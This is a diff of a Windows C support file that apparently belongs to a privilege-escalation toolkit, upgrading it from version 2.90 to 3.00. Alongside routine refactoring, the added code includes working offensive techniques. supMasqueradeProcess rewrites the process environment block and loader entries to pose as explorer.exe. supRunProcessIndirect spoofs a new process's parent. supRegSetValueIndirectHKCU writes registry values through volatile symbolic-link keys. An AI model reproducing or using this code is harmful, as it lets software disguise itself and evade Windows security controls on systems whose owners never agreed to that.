@@ -4,9 +4,9 @@
 *
 *  TITLE:       SUP.C
 *
-*  VERSION:     2.90
+*  VERSION:     3.00
 *
-*  DATE:        10 July 2018
+*  DATE:        25 Aug 2018
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -15,6 +15,156 @@
 *
 *******************************************************************************/
 #include "global.h"
+
+/*
+* supEncodePointer
+*
+* Purpose:
+*
+* Encodes the specified pointer.
+*
+*/
+PVOID supEncodePointer(
+    _In_ PVOID Pointer)
+{   
+    NTSTATUS Status;
+    ULONG Cookie, retLength;
+
+    if (g_ctx.Cookie == 0) {
+
+        Status = NtQueryInformationProcess(
+            NtCurrentProcess(),
+            ProcessCookie,
+            &Cookie,
+            sizeof(ULONG),
+            &retLength);
+
+        if (!NT_SUCCESS(Status))
+            RtlRaiseStatus(Status);
+
+        g_ctx.Cookie = Cookie;
+
+    }
+    else {
+        Cookie = g_ctx.Cookie;
+    }
+
+#ifdef _WIN64
+    return (PVOID)(RotateRight64(
+        (ULONG_PTR)Pointer ^ Cookie,
+        Cookie & 0x3f));
+#else
+    return (PVOID)(RotateRight32(
+        (ULONG_PTR)Pointer ^ Cookie, 
+        Cookie & 0x1f));
+#endif
+}
+
+/*
+* supDecodePointer
+*
+* Purpose:
+*
+* Decodes the specified pointer.
+*
+*/
+PVOID supDecodePointer(
+    _In_ PVOID Pointer)
+{
+    NTSTATUS Status;
+    ULONG Cookie, retLength;
+
+    if (g_ctx.Cookie == 0) {
+
+        Status = NtQueryInformationProcess(
+            NtCurrentProcess(),
+            ProcessCookie,
+            &Cookie,
+            sizeof(ULONG),
+            &retLength);
+
+        if (!NT_SUCCESS(Status))
+            RtlRaiseStatus(Status);
+
+    }
+    else {
+        Cookie = g_ctx.Cookie;
+    }
+
+#ifdef _WIN64
+    return (PVOID)(RotateRight64(
+        (ULONG_PTR)Pointer, 
+        0x40 - (Cookie & 0x3f)) ^ Cookie);
+#else
+    return (PVOID)(RotateRight32(
+        (ULONG_PTR)Pointer, 
+        0x20 - (Cookie & 0x1f)) ^ Cookie);
+#endif
+}
+
+/*
+* supVirtualAlloc
+*
+* Purpose:
+*
+* Wrapper for NtAllocateVirtualMemory.
+*
+*/
+PVOID supVirtualAlloc(
+    _Inout_ PSIZE_T Size,
+    _In_ ULONG AllocationType,
+    _In_ ULONG Protect,
+    _Out_opt_ NTSTATUS *Status)
+{
+    NTSTATUS status;
+    PVOID Buffer = NULL;
+    SIZE_T size;
+    
+    size = *Size;
+
+    status = NtAllocateVirtualMemory(
+        NtCurrentProcess(),
+        &Buffer,
+        0,
+        &size,
+        AllocationType,
+        Protect);
+
+    if (NT_SUCCESS(status)) {
+        RtlSecureZeroMemory(Buffer, size);
+    }
+
+    *Size = size;
+    if (Status) *Status = status;
+
+    return Buffer;
+}
+
+/*
+* supVirtualFree
+*
+* Purpose:
+*
+* Wrapper for NtFreeVirtualMemory.
+*
+*/
+BOOL supVirtualFree(
+    _In_ PVOID Memory,
+    _Out_opt_ NTSTATUS *Status)
+{
+    NTSTATUS status = STATUS_UNSUCCESSFUL;
+    SIZE_T size = 0;
+
+    status = NtFreeVirtualMemory(
+        NtCurrentProcess(),
+        &Memory,
+        &size,
+        MEM_RELEASE);
+
+    if (Status) *Status = status;
+
+    return NT_SUCCESS(status);
+}
 
 /*
 * supHeapAlloc
@@ -42,6 +192,135 @@ BOOL FORCEINLINE supHeapFree(
     _In_ PVOID Memory)
 {
     return RtlFreeHeap(g_ctx.ucmHeap, 0, Memory);
+}
+
+/*
+* supQueryProcessTokenIL
+*
+* Purpose:
+*
+* Return integrity level for given process.
+*
+*/
+_Success_(return == TRUE)
+BOOL supQueryProcessTokenIL(
+    _In_ HANDLE hProcess,
+    _Out_ PULONG IntegrityLevel)
+{
+    BOOL                            bCond = FALSE, bResult = FALSE;
+    HANDLE                          hToken = NULL;
+    PTOKEN_MANDATORY_LABEL          pTIL = NULL;
+    ULONG                           Length = 0;
+
+    do {
+
+        if (!NT_SUCCESS(NtOpenProcessToken(
+            hProcess,
+            TOKEN_QUERY,
+            &hToken)))
+        {
+            break;
+        }
+
+        if (STATUS_BUFFER_TOO_SMALL != NtQueryInformationToken(
+            hToken,
+            TokenIntegrityLevel,
+            NULL,
+            0,
+            &Length))
+        {
+            break;
+        }
+
+        pTIL = (PTOKEN_MANDATORY_LABEL)_alloca(Length); //-V505
+
+        if (!NT_SUCCESS(NtQueryInformationToken(
+            hToken,
+            TokenIntegrityLevel,
+            pTIL,
+            Length,
+            &Length)))
+        {
+            break;
+        }
+
+        if (IntegrityLevel)
+            *IntegrityLevel = *RtlSubAuthoritySid(
+                pTIL->Label.Sid,
+                (DWORD)(UCHAR)(*RtlSubAuthorityCountSid(pTIL->Label.Sid) - 1));
+
+        bResult = TRUE;
+
+    } while (bCond);
+
+    if (hToken) NtClose(hToken);
+
+    return bResult;
+}
+
+/*
+* supGetProcessWithILAsCaller
+*
+* Purpose:
+*
+* Returns handle for the process with same integrity level as caller.
+*
+*/
+HANDLE supGetProcessWithILAsCaller(
+    _In_ ACCESS_MASK UseDesiredAccess
+)
+{
+    BOOL                            bCond = FALSE;
+    HANDLE                          hProcess = NULL;
+    HANDLE                          CurrentProcessId = NtCurrentTeb()->ClientId.UniqueProcess;
+    PSYSTEM_PROCESSES_INFORMATION   ProcessList = NULL, pList;
+    CLIENT_ID                       cid;
+    OBJECT_ATTRIBUTES               obja;
+    ULONG                           Level = 0, ForeignLevel = 0;
+
+    do {
+
+        if (!supQueryProcessTokenIL(NtCurrentProcess(), &Level))
+            break;
+
+        ProcessList = supGetSystemInfo(SystemProcessInformation);
+        if (ProcessList) {
+            pList = ProcessList;
+            for (;;) {
+
+                if (pList->UniqueProcessId != CurrentProcessId) {
+
+                    cid.UniqueProcess = pList->UniqueProcessId;
+                    cid.UniqueThread = NULL;
+                    InitializeObjectAttributes(&obja, NULL, 0, NULL, NULL);
+
+                    if (NT_SUCCESS(NtOpenProcess(
+                        &hProcess,
+                        PROCESS_QUERY_LIMITED_INFORMATION | UseDesiredAccess,
+                        &obja,
+                        &cid)))
+                    {
+                        if (supQueryProcessTokenIL(hProcess, &ForeignLevel)) {
+                            if (ForeignLevel == Level)
+                                break;
+                        }
+                        NtClose(hProcess);
+                    }
+                }
+
+                if (pList->NextEntryDelta == 0)
+                    break;
+
+                pList = (PSYSTEM_PROCESSES_INFORMATION)(((LPBYTE)pList) + pList->NextEntryDelta);
+            }
+
+        } //if
+
+    } while (bCond);
+
+    if (ProcessList) supHeapFree(ProcessList);
+
+    return hProcess;
 }
 
 /*
@@ -99,7 +378,7 @@ BOOL supGetElevationType(
         NtClose(hToken);
     }
 
-    SetLastError(RtlNtStatusToDosError(status));
+    supSetLastErrorFromNtStatus(status);
 
     if (lpType)
         *lpType = TokenType;
@@ -135,7 +414,9 @@ BOOL supWriteBufferToFile(
         CloseHandle(hFile);
     }
     else {
+#ifdef _DEBUG
         supDebugPrint(TEXT("CreateFile"), GetLastError());
+#endif
         return FALSE;
     }
 
@@ -206,11 +487,6 @@ NTSTATUS supRegReadValue(
     *Buffer = NULL;
     *BufferSize = 0;
 
-    usName.Buffer = NULL;
-    usName.Length = 0;
-    usName.MaximumLength = 0;
-
-
     if (hHeap == NULL)
         Heap = NtCurrentPeb()->ProcessHeap;
     else
@@ -254,6 +530,39 @@ NTSTATUS supRegReadValue(
 }
 
 /*
+* supDeleteKeyValueAndFlushKey
+*
+* Purpose:
+*
+* Remove value of the given subkey and flush key.
+*
+*/
+BOOL supDeleteKeyValueAndFlushKey(
+    _In_ HKEY hRootKey,
+    _In_ LPWSTR lpKeyName,
+    _In_ LPWSTR lpValueName)
+{
+    HKEY hKey = NULL;
+    LRESULT lResult;
+
+    if (ERROR_SUCCESS == RegOpenKeyEx(
+        hRootKey,
+        lpKeyName,
+        0,
+        MAXIMUM_ALLOWED,
+        &hKey))
+    {
+        lResult = RegDeleteValue(hKey, lpValueName);
+        if (lResult == ERROR_SUCCESS) {
+            RegFlushKey(hKey);
+        }
+        RegCloseKey(hKey);
+        return (lResult == ERROR_SUCCESS);
+    }
+    return FALSE;
+}
+
+/*
 * supReadFileToBuffer
 *
 * Purpose:
@@ -279,8 +588,6 @@ PBYTE supReadFileToBuffer(
 
     do {
 
-        RtlSecureZeroMemory(&usName, sizeof(usName));
-
         if (lpFileName == NULL)
             return NULL;
 
@@ -291,7 +598,10 @@ PBYTE supReadFileToBuffer(
         }
 
         InitializeObjectAttributes(&attr, &usName, OBJ_CASE_INSENSITIVE, 0, NULL);
-        status = NtCreateFile(&hRoot, FILE_LIST_DIRECTORY | SYNCHRONIZE,
+        
+        status = NtCreateFile(
+            &hRoot, 
+            FILE_LIST_DIRECTORY | SYNCHRONIZE,
             &attr,
             &iost,
             NULL,
@@ -312,7 +622,8 @@ PBYTE supReadFileToBuffer(
         RtlInitUnicodeString(&usName, lpFileName);
         InitializeObjectAttributes(&attr, &usName, OBJ_CASE_INSENSITIVE, hRoot, NULL);
 
-        status = NtCreateFile(&hFile,
+        status = NtCreateFile(
+            &hFile,
             FILE_READ_DATA | SYNCHRONIZE,
             &attr,
             &iost,
@@ -330,22 +641,44 @@ PBYTE supReadFileToBuffer(
         }
 
         RtlSecureZeroMemory(&fi, sizeof(fi));
-        status = NtQueryInformationFile(hFile, &iost, &fi, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
+        
+        status = NtQueryInformationFile(
+            hFile, 
+            &iost, 
+            &fi, 
+            sizeof(FILE_STANDARD_INFORMATION), 
+            FileStandardInformation);
+        
         if (!NT_SUCCESS(status))
             break;
 
         sz = (SIZE_T)fi.EndOfFile.LowPart;
-        status = NtAllocateVirtualMemory(NtCurrentProcess(), &Buffer, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+        Buffer = supVirtualAlloc(
+            &sz, 
+            DEFAULT_ALLOCATION_TYPE, 
+            DEFAULT_PROTECT_TYPE, 
+            &status);
+
         if (NT_SUCCESS(status)) {
 
-            status = NtReadFile(hFile, NULL, NULL, NULL, &iost, Buffer, fi.EndOfFile.LowPart, NULL, NULL);
+            status = NtReadFile(
+                hFile, 
+                NULL, 
+                NULL, 
+                NULL, 
+                &iost, 
+                Buffer, 
+                fi.EndOfFile.LowPart, 
+                NULL, 
+                NULL);
+
             if (NT_SUCCESS(status)) {
                 if (lpBufferSize)
                     *lpBufferSize = fi.EndOfFile.LowPart;
             }
             else {
-                sz = 0;
-                NtFreeVirtualMemory(NtCurrentProcess(), &Buffer, &sz, MEM_RELEASE);
+                supVirtualFree(Buffer, NULL);
                 Buffer = NULL;
             }
         }
@@ -394,8 +727,10 @@ BOOL supRunProcess2(
     shinfo.lpVerb = lpVerb;
     bResult = ShellExecuteEx(&shinfo);
     if (bResult) {
-        if (fWait)
-            WaitForSingleObject(shinfo.hProcess, 0x8000);
+        if (fWait) {
+            if (WaitForSingleObject(shinfo.hProcess, 32000) == WAIT_TIMEOUT)
+                TerminateProcess(shinfo.hProcess, WAIT_TIMEOUT);
+        }
         CloseHandle(shinfo.hProcess);
     }
     return bResult;
@@ -425,11 +760,12 @@ BOOL supRunProcess(
 * Start new process in suspended state.
 *
 */
+_Success_(return != NULL)
 HANDLE NTAPI supRunProcessEx(
     _In_ LPWSTR lpszParameters,
     _In_opt_ LPWSTR lpCurrentDirectory,
-    _Out_opt_ HANDLE *PrimaryThread,
-    _Inout_opt_ LPWSTR lpApplicationName
+    _In_opt_ LPWSTR lpApplicationName,
+    _Out_opt_ HANDLE *PrimaryThread
 )
 {
     BOOL bResult = FALSE;
@@ -438,9 +774,6 @@ HANDLE NTAPI supRunProcessEx(
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
     DWORD dwFlags = CREATE_DEFAULT_ERROR_MODE | NORMAL_PRIORITY_CLASS;
-
-    if (PrimaryThread)
-        *PrimaryThread = NULL;
 
     if (lpszParameters == NULL)
         return NULL;
@@ -480,6 +813,113 @@ HANDLE NTAPI supRunProcessEx(
     }
     supHeapFree(pszBuffer);
     return pi.hProcess;
+}
+
+/*
+* supRunProcessIndirect
+*
+* Purpose:
+*
+* Start new process indirectly with parent set to
+* randomly selected process of the same IL.
+*
+*/
+_Success_(return != NULL)
+HANDLE NTAPI supRunProcessIndirect(
+    _In_ LPWSTR lpszParameters,
+    _In_opt_ LPWSTR lpCurrentDirectory,
+    _Inout_opt_ LPWSTR lpApplicationName,
+    _In_ ULONG CreationFlags,
+    _In_ WORD ShowWindowFlags,
+    _Out_opt_ HANDLE *PrimaryThread
+)
+{
+    BOOL bResult = FALSE;
+    DWORD dwFlags = CreationFlags | CREATE_DEFAULT_ERROR_MODE | NORMAL_PRIORITY_CLASS;
+
+    LPWSTR pszBuffer = NULL;
+    SIZE_T size;
+    STARTUPINFOEX si;
+    PROCESS_INFORMATION pi;
+
+    HANDLE hProcess, hToken = NULL, hNewProcess = NULL;
+
+    hProcess = supGetProcessWithILAsCaller(PROCESS_CREATE_PROCESS);
+    if (hProcess == NULL)
+        return NULL;
+
+    RtlSecureZeroMemory(&pi, sizeof(pi));
+    RtlSecureZeroMemory(&si, sizeof(si));
+
+    size = (1 + _strlen(lpszParameters)) * sizeof(WCHAR);
+    pszBuffer = supHeapAlloc(size);
+    if (pszBuffer) {
+
+        _strcpy(pszBuffer, lpszParameters);
+        si.StartupInfo.cb = sizeof(STARTUPINFOEX);
+
+        size = 0x30;
+
+        do {
+            if (size > 1024)
+                break;
+
+            if (size)
+                si.lpAttributeList = _alloca(size); //-V505
+
+            if (InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size)) {
+                if (UpdateProcThreadAttribute(si.lpAttributeList, 0,
+                    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProcess, sizeof(hProcess), 0, 0)) //-V616
+                {
+
+                    if (NT_SUCCESS(NtOpenProcessToken(
+                        hProcess,
+                        TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY,
+                        &hToken)))
+                    {
+                        si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
+                        si.StartupInfo.wShowWindow = ShowWindowFlags;
+
+                        bResult = CreateProcessAsUser(
+                            hToken,
+                            lpApplicationName,
+                            pszBuffer,
+                            NULL,
+                            NULL,
+                            FALSE,
+                            dwFlags | EXTENDED_STARTUPINFO_PRESENT,
+                            NULL,
+                            lpCurrentDirectory,
+                            (LPSTARTUPINFO)&si,
+                            &pi);
+
+                        if (bResult) {
+                            hNewProcess = pi.hProcess;
+                            if (PrimaryThread) {
+                                *PrimaryThread = pi.hThread;
+                            }
+                            else {
+                                CloseHandle(pi.hThread);
+                            }
+                        }
+
+                        NtClose(hToken);
+                    }
+
+                }
+            
+                if (si.lpAttributeList)
+                    DeleteProcThreadAttributeList(si.lpAttributeList); //dumb empty routine
+            }
+
+        } while (GetLastError() == ERROR_INSUFFICIENT_BUFFER);
+
+        supHeapFree(pszBuffer);
+    }
+
+    NtClose(hProcess);
+
+    return hNewProcess;
 }
 
 /*
@@ -575,7 +1015,6 @@ LPWSTR supQueryEnvironmentVariableOffset(
         if (*ptr == 0)
             return 0;
 
-        RtlSecureZeroMemory(&str1, sizeof(str1));
         RtlInitUnicodeString(&str1, ptr);
         if (RtlPrefixUnicodeString(Value, &str1, TRUE))
             break;
@@ -890,7 +1329,37 @@ PBYTE supLdrQueryResourceData(
     return Data;
 }
 
-static LPWSTR g_lpszExplorer = NULL;
+/*
+* supSetLastErrorFromNtStatus
+*
+* Purpose:
+*
+* Convert last error.
+*
+*/
+VOID supSetLastErrorFromNtStatus(
+    _In_ NTSTATUS LastNtStatus
+)
+{
+    DWORD dwErrorCode;
+#ifdef _WIN64
+    dwErrorCode = RtlNtStatusToDosErrorNoTeb(LastNtStatus);
+#else
+    dwErrorCode = RtlNtStatusToDosError(LastNtStatus);
+#endif
+    SetLastError(dwErrorCode);
+}
+
+static PWSTR g_lpszExplorer = NULL;
+
+typedef struct _LDR_BACKUP {
+    PWSTR ImagePathName;
+    PWSTR CommandLine;
+    PWSTR lpFullDllName;
+    PWSTR lpBaseDllName;
+} LDR_BACKUP, *PLDR_BACKUP;
+
+static LDR_BACKUP g_LdrBackup;
 
 /*
 * supxLdrEnumModulesCallback
@@ -906,11 +1375,27 @@ VOID NTAPI supxLdrEnumModulesCallback(
     _Inout_ BOOLEAN *StopEnumeration
 )
 {
-    PPEB Peb = (PPEB)Context;
+    PPEB Peb = NtCurrentPeb();
+    PWSTR FullDllName, BaseDllName;
+
+    BOOL Restore = PtrToInt(Context);
 
     if (DataTableEntry->DllBase == Peb->ImageBaseAddress) {
-        RtlInitUnicodeString(&DataTableEntry->FullDllName, g_lpszExplorer);
-        RtlInitUnicodeString(&DataTableEntry->BaseDllName, EXPLORER_EXE);
+
+        if (Restore) {
+            FullDllName = g_LdrBackup.lpFullDllName;
+            BaseDllName = g_LdrBackup.lpBaseDllName;
+        }
+        else {
+            g_LdrBackup.lpBaseDllName = DataTableEntry->BaseDllName.Buffer;
+            g_LdrBackup.lpFullDllName = DataTableEntry->FullDllName.Buffer;
+            FullDllName = g_lpszExplorer;
+            BaseDllName = EXPLORER_EXE;
+        }
+
+        RtlInitUnicodeString(&DataTableEntry->FullDllName, FullDllName);
+        RtlInitUnicodeString(&DataTableEntry->BaseDllName, BaseDllName);
+
         *StopEnumeration = TRUE;
     }
     else {
@@ -923,44 +1408,74 @@ VOID NTAPI supxLdrEnumModulesCallback(
 *
 * Purpose:
 *
-* Fake current process information.
-* As in fact Windows only cares about loader entry information as they use PSAPI like bullshit.
+* Fake/Restore current process information.
 *
 */
 VOID supMasqueradeProcess(
-    VOID
+    _In_ BOOL Restore
 )
 {
-    NTSTATUS Status;
-    PPEB    Peb = NtCurrentPeb();
-    SIZE_T  RegionSize;
+    NTSTATUS    Status;
+    PPEB        Peb = NtCurrentPeb();
+    SIZE_T      RegionSize;
 
-    g_lpszExplorer = NULL;
-    RegionSize = 0x1000;
+    PWSTR ImageFileName, CommandLine;
 
-    Status = NtAllocateVirtualMemory(
-        NtCurrentProcess(),
-        &g_lpszExplorer,
-        0,
-        &RegionSize,
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_READWRITE);
+    if (Restore == FALSE) {
 
-    if (NT_SUCCESS(Status)) {
-        if (g_lpszExplorer) {
+        g_lpszExplorer = NULL;
+        RegionSize = 0x1000;
+        Status = NtAllocateVirtualMemory(
+            NtCurrentProcess(),
+            &g_lpszExplorer,
+            0,
+            &RegionSize,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE);
+
+        if (NT_SUCCESS(Status)) {
             _strcpy(g_lpszExplorer, g_ctx.szSystemRoot);
             _strcat(g_lpszExplorer, EXPLORER_EXE);
-
-            RtlEnterCriticalSection(Peb->FastPebLock);
-
-            RtlInitUnicodeString(&Peb->ProcessParameters->ImagePathName, g_lpszExplorer);
-            RtlInitUnicodeString(&Peb->ProcessParameters->CommandLine, APPCMDLINE);
-
-            RtlLeaveCriticalSection(Peb->FastPebLock);
-
-            LdrEnumerateLoadedModules(0, &supxLdrEnumModulesCallback, (PVOID)Peb);
+        }
+        else {
+            supSetLastErrorFromNtStatus(Status);
+            return;
         }
     }
+
+    RtlAcquirePebLock();
+
+    if (Restore) {
+        CommandLine = g_LdrBackup.CommandLine;
+        ImageFileName = g_LdrBackup.ImagePathName;
+    }
+    else {
+        g_LdrBackup.ImagePathName = Peb->ProcessParameters->ImagePathName.Buffer;
+        g_LdrBackup.CommandLine = Peb->ProcessParameters->CommandLine.Buffer;
+
+        ImageFileName = g_lpszExplorer;
+        CommandLine = EXPLORER_EXE;
+    }
+
+    RtlInitUnicodeString(&Peb->ProcessParameters->ImagePathName, ImageFileName);
+    RtlInitUnicodeString(&Peb->ProcessParameters->CommandLine, CommandLine);
+
+    if (Restore) {
+
+        RegionSize = 0;
+        NtFreeVirtualMemory(
+            NtCurrentProcess(),
+            &g_lpszExplorer,
+            &RegionSize,
+            MEM_RELEASE);
+
+        g_lpszExplorer = NULL;
+
+    }
+
+    RtlReleasePebLock();
+
+    LdrEnumerateLoadedModules(0, &supxLdrEnumModulesCallback, IntToPtr(Restore));
 }
 
 /*
@@ -989,7 +1504,6 @@ DWORD supExpandEnvironmentStrings(
         iSize = nSize;
     }
 
-    RtlSecureZeroMemory(&Source, sizeof(Source));
     RtlInitUnicodeString(&Source, lpSrc);
     Destination.Buffer = lpDst;
     Destination.Length = 0;
@@ -1004,7 +1518,7 @@ DWORD supExpandEnvironmentStrings(
         return (DWORD)(Length / sizeof(WCHAR));
     }
     else {
-        RtlSetLastWin32Error(RtlNtStatusToDosError(Status));
+        supSetLastErrorFromNtStatus(Status);
         return 0;
     }
 }
@@ -1044,46 +1558,61 @@ wchar_t *sxsFilePathNoSlash(
 }
 
 /*
-* sxsFindDllCallback
+* sxsFindLoaderEntry
 *
 * Purpose:
 *
-* LdrEnumerateLoadedModules callback used to lookup sxs dlls from loader list.
+* Return loader entry filename for sxs dll.
 *
 */
-VOID NTAPI sxsFindDllCallback(
-    _In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry,
-    _In_ PVOID Context,
-    _Inout_ BOOLEAN *StopEnumeration
+BOOL sxsFindLoaderEntry(
+    _In_ PSXS_SEARCH_CONTEXT Context
 )
 {
-    BOOL bCond = FALSE;
-    BOOLEAN bFound = FALSE;
-    PSXS_SEARCH_CONTEXT sctx = (PSXS_SEARCH_CONTEXT)Context;
+    NTSTATUS Status;
+    HANDLE hDll = NULL;
+    UNICODE_STRING usDll;
 
-    do {
+    PLDR_DATA_TABLE_ENTRY LdrTableEntry = NULL;
 
-        if ((sctx == NULL) || (DataTableEntry == NULL))
-            break;
+    RtlInitUnicodeString(&usDll, Context->DllName);
 
-        if ((DataTableEntry->BaseDllName.Buffer == NULL) ||
-            (DataTableEntry->FullDllName.Buffer == NULL))
-            break;
+    Status = LdrGetDllHandle(
+        NULL,
+        NULL,
+        &usDll,
+        &hDll);
 
-        if (_strcmpi(DataTableEntry->BaseDllName.Buffer, sctx->DllName) != 0)
-            break;
+    if (NT_SUCCESS(Status)) {
 
-        if (_strstri(DataTableEntry->FullDllName.Buffer, sctx->PartialPath) == NULL)
-            break;
+        Status = LdrFindEntryForAddress(
+            hDll,
+            &LdrTableEntry);
 
-        if (sxsFilePathNoSlash(DataTableEntry->FullDllName.Buffer, sctx->FullDllPath) == NULL)
-            break;
+        if (NT_SUCCESS(Status)) {
 
-        bFound = TRUE;
+            if (_strstri(
+                LdrTableEntry->FullDllName.Buffer,
+                L".local") == NULL)
+            {
+                if (_strstri(
+                    LdrTableEntry->FullDllName.Buffer,
+                    Context->SxsKey))
+                {
+                    sxsFilePathNoSlash(
+                        LdrTableEntry->FullDllName.Buffer,
+                        Context->FullDllPath);
 
-    } while (bCond);
+                }
+                else
+                    Status = STATUS_NOT_FOUND;
+            }
+            else
+                Status = STATUS_TOO_LATE;
+        }
+    }
 
-    *StopEnumeration = bFound;
+    return NT_SUCCESS(Status);
 }
 
 /*
@@ -1140,7 +1669,6 @@ PVOID supNativeGetProcAddress(
     UNICODE_STRING   DllName;
     ANSI_STRING      str;
 
-    RtlSecureZeroMemory(&DllName, sizeof(DllName));
     RtlInitUnicodeString(&DllName, Module);
     if (!NT_SUCCESS(LdrGetDllHandle(NULL, NULL, &DllName, &DllImageBase)))
         return NULL;
@@ -1240,7 +1768,7 @@ BOOL supxDeleteKeyRecursive(
 }
 
 /*
-* supDeleteKeyRecursive
+* supRegDeleteKeyRecursive
 *
 * Purpose:
 *
@@ -1251,7 +1779,7 @@ BOOL supxDeleteKeyRecursive(
 * SubKey should not be longer than 260 chars.
 *
 */
-BOOL supDeleteKeyRecursive(
+BOOL supRegDeleteKeyRecursive(
     _In_ HKEY hKeyRoot,
     _In_ LPWSTR lpSubKey)
 {
@@ -1349,7 +1877,7 @@ BOOL supDeleteMountPoint(
         SetLastError(ERROR_INVALID_PARAMETER);
     }
     else {
-        SetLastError(RtlNtStatusToDosError(status));
+        supSetLastErrorFromNtStatus(status);
     }
 
     return NT_SUCCESS(status);
@@ -1437,7 +1965,7 @@ BOOL supSetMountPoint(
 
     supHeapFree(Buffer);
 
-    SetLastError(RtlNtStatusToDosError(status));
+    supSetLastErrorFromNtStatus(status);
     return NT_SUCCESS(status);
 }
 
@@ -1479,7 +2007,7 @@ HANDLE supOpenDirectoryForReparse(
         RtlFreeUnicodeString(&usReparseDirectory);
     }
 
-    SetLastError(RtlNtStatusToDosError(status));
+    supSetLastErrorFromNtStatus(status);
 
     return hReparseDirectory;
 }
@@ -1518,9 +2046,6 @@ BOOL supSetupIPCLinkData(
         if (!NT_SUCCESS(status))
             break;
 
-        ChildName.Buffer = NULL;
-        ChildName.Length = 0;
-        ChildName.MaximumLength = 0;
         RtlInitUnicodeString(&ChildName, lpUser);
         attr.RootDirectory = hRoot;
         attr.ObjectName = &ChildName;
@@ -1729,7 +2254,6 @@ BOOL supQuerySystemRoot(
     ULONG               Length = 0, cbSystem32Prep = sizeof(szSystem32Prep) - sizeof(WCHAR);
 
     do {
-        UString.Buffer = NULL;
         _strcpy(szBuffer, T_REGISTRY_PREP);
         _strcat(szBuffer, T_WINDOWS_CURRENT_VERSION);
         RtlInitUnicodeString(&UString, szBuffer);
@@ -1785,7 +2309,7 @@ BOOL supQuerySystemRoot(
 *
 * Returns buffer with system information by given InfoClass.
 *
-* Returned buffer must be freed with HeapFree after usage.
+* Returned buffer must be freed with supHeapFree after usage.
 * Function will return error after 20 attempts.
 *
 */
@@ -1854,4 +2378,457 @@ BOOL supIsCorImageFile(
         bResult = TRUE;
     }
     return bResult;
+}
+
+/*
+* supRegSetValueIndirectHKCU
+*
+* Purpose:
+*
+* Indirectly set registry Value for TargetKey in the current user hive.
+*
+*/
+NTSTATUS supRegSetValueIndirectHKCU(
+    _In_ LPWSTR TargetKey,
+    _In_opt_ LPWSTR ValueName,
+    _In_ LPWSTR lpData,
+    _In_ ULONG cbData
+)
+{
+    BOOL bCond = FALSE;
+    HANDLE hKey = NULL;
+    NTSTATUS status = STATUS_UNSUCCESSFUL;
+    UNICODE_STRING usCurrentUser, usLinkPath;
+    OBJECT_ATTRIBUTES obja;
+    UNICODE_STRING CmSymbolicLinkValue = RTL_CONSTANT_STRING(L"SymbolicLinkValue");
+
+    HANDLE hHeap = NtCurrentPeb()->ProcessHeap;
+
+    SIZE_T memIO;
+
+    PWSTR lpLinkKeyBuffer = NULL, lpBuffer = NULL;
+    ULONG cbKureND = sizeof(T_SYMLINK) - sizeof(WCHAR);
+    ULONG dummy;
+
+    status = RtlFormatCurrentUserKeyPath(&usCurrentUser);
+    if (!NT_SUCCESS(status))
+        return status;
+
+    do {
+
+        memIO = sizeof(UNICODE_NULL) + usCurrentUser.MaximumLength + cbKureND;
+        lpLinkKeyBuffer = RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, memIO);
+        if (lpLinkKeyBuffer == NULL)
+            break;
+
+        usLinkPath.Buffer = lpLinkKeyBuffer;
+        usLinkPath.Length = 0;
+        usLinkPath.MaximumLength = (USHORT)memIO;
+
+        status = RtlAppendUnicodeStringToString(&usLinkPath, &usCurrentUser);
+        if (!NT_SUCCESS(status))
+            break;
+
+        status = RtlAppendUnicodeToString(&usLinkPath, T_SYMLINK);
+        if (!NT_SUCCESS(status))
+            break;
+
+        InitializeObjectAttributes(&obja, &usLinkPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+        //
+        // Create link key.
+        //
+        status = NtCreateKey(&hKey, KEY_ALL_ACCESS,
+            &obja, 0, NULL,
+            REG_OPTION_CREATE_LINK | REG_OPTION_VOLATILE,
+            &dummy);
+
+        //
+        // If link already created, update it.
+        //
+        if (status == STATUS_OBJECT_NAME_COLLISION) {
+
+            obja.Attributes |= OBJ_OPENLINK;
+
+            status = NtOpenKey(&hKey,
+                KEY_ALL_ACCESS,
+                &obja);
+
+        }
+
+        if (!NT_SUCCESS(status))
+            break;
+
+        memIO = sizeof(UNICODE_NULL) + usCurrentUser.MaximumLength + ((1 + _strlen(TargetKey)) * sizeof(WCHAR));
+        lpBuffer = RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, memIO);
+        if (lpBuffer == NULL)
+            break;
+
+        _strcpy(lpBuffer, usCurrentUser.Buffer);
+        _strcat(lpBuffer, L"\\");
+        _strcat(lpBuffer, TargetKey);
+
+        memIO = _strlen(lpBuffer) * sizeof(WCHAR); //no null termination
+        status = NtSetValueKey(hKey, &CmSymbolicLinkValue, 0, REG_LINK, (PVOID)lpBuffer, (ULONG)memIO);
+        NtClose(hKey);
+        hKey = NULL;
+
+        if (!NT_SUCCESS(status))
+            break;
+
+        //
+        // Set value indirect.
+        //
+        obja.Attributes = OBJ_CASE_INSENSITIVE;
+        status = NtOpenKey(&hKey, KEY_ALL_ACCESS, &obja);
+        if (NT_SUCCESS(status)) {
+
+            //
+            // If this is Default value - supply empty US.
+            //
+            if (ValueName == NULL) {
+                RtlSecureZeroMemory(&usLinkPath, sizeof(usLinkPath));
+            }
+            else {
+                RtlInitUnicodeString(&usLinkPath, ValueName);
+            }
+            status = NtSetValueKey(hKey, &usLinkPath, 0, REG_SZ, (PVOID)lpData, (ULONG)cbData);
+            NtClose(hKey);
+            hKey = NULL;
+        }
+
+    } while (bCond);
+
+    if (lpLinkKeyBuffer) RtlFreeHeap(hHeap, 0, lpLinkKeyBuffer);
+    if (lpBuffer) RtlFreeHeap(hHeap, 0, lpBuffer);
+    if (hKey) NtClose(hKey);
+    RtlFreeUnicodeString(&usCurrentUser);
+
+    return status;
